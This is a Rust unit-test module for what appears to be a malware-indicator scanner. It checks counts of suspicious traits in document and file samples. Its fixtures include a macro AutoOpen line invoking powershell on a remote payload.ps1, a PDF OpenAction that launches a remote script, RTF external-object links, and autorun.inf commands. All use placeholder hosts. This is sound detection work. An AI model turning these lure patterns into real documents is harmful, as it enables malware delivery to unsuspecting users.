    fn windows_appinstaller_manifest_and_remote_package_are_counted() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msix" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_appinstaller_document_link_without_package_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/readme.html" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn utf16le_unc_executable_path_is_counted() {
        let mut bytes = Vec::new();
        for unit in r"ShellLink target \\fileserver\share\support.ps1".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_unc_document_path_is_not_counted() {
        let indicators = extract_indicators(br"\\fileserver\share\readme.txt");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn local_file_url_executable_path_is_not_remote_network_path() {
        let indicators = extract_indicators(b"file:///C:/Users/Public/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn remote_file_url_executable_path_is_counted() {
        let indicators = extract_indicators(b"file://fileserver/share/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn macro_auto_run_terms_are_counted() {
        let indicators = extract_indicators(
            b"Sub AutoOpen()\nEnd Sub\nPrivate Sub Document_Open()\nEnd Sub\nWorkbook_Open",
        );

        assert_eq!(indicators.macro_auto_run_count, 3);
    }

    #[test]
    fn utf16le_macro_auto_run_terms_are_counted() {
        let mut bytes = Vec::new();
        for unit in "Sub AutoOpen(): powershell https://example.invalid/payload.ps1".encode_utf16()
        {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.macro_auto_run_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn rtf_external_object_terms_are_counted() {
        let indicators = extract_indicators(
            br"{\rtf1{\object\objautlink\objupdate file://fileserver/share/support.vbs}{\field{\*\fldinst INCLUDEPICTURE https://example.invalid/payload.ps1}}}",
        );

        assert!(indicators.rtf_external_object_count >= 4);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_object_words_outside_rtf_are_not_rtf_object_terms() {
        let indicators =
            extract_indicators(b"object field includepicture https://example.invalid/payload.ps1");

        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn pdf_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>\nendobj",
        );

        assert!(indicators.pdf_active_content_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_pdf_are_not_pdf_active_content() {
        let indicators =
            extract_indicators(b"/OpenAction /JavaScript https://example.invalid/payload.js");

        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn web_document_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            br#"<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>"#,
        );

        assert!(indicators.web_document_active_content_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_web_document_are_not_web_document_active_content() {
        let indicators =
            extract_indicators(b"<script>javascript: atob('x') https://example.invalid/payload.js");

        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn autorun_inf_executable_commands_are_counted() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=support.exe /quiet
shellexecute=file://fileserver/share/support.vbs
shell\open\command=cmd.exe /c support.cmd
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 3);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn ordinary_inf_text_without_autorun_section_is_not_autorun_command() {
        let indicators = extract_indicators(
            br#"
[version]
signature="$windows nt$"
open=support.exe
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
    }

    #[test]
    fn autorun_inf_document_link_is_not_executable_command() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=readme.txt
shellexecute=https://example.invalid/readme.html
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn disk_image_autorun_executable_is_counted() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(
            b"\0AUTORUN.INF\0[autorun]\0open=setup.exe\0shell\\open\\command=runme.cmd\0",
        );

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 1);
    }

    #[test]
    fn ordinary_iso_text_without_disk_marker_is_not_disk_image_autorun() {
        let indicators =
            extract_indicators(b"autorun.inf [autorun] open=setup.exe without image marker");

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn disk_image_autorun_document_link_is_not_executable() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(b"\0AUTORUN.INF\0[autorun]\0open=readme.pdf\0");

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn email_executable_attachment_names_are_counted() {
        let indicators = extract_indicators(
            br#"From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 2);
    }

    #[test]
    fn ordinary_email_document_attachment_is_not_executable_attachment() {
        let indicators = extract_indicators(
            br#"From: docs@example.invalid
Subject: notes
MIME-Version: 1.0
Content-Type: text/plain; name="readme.txt"
Content-Disposition: attachment; filename="readme.txt"
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn attachment_words_outside_email_are_not_email_attachment_evidence() {
        let indicators = extract_indicators(
            br#"Content-Disposition: attachment; filename="invoice.exe"
MIME-Version: 1.0
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }
}
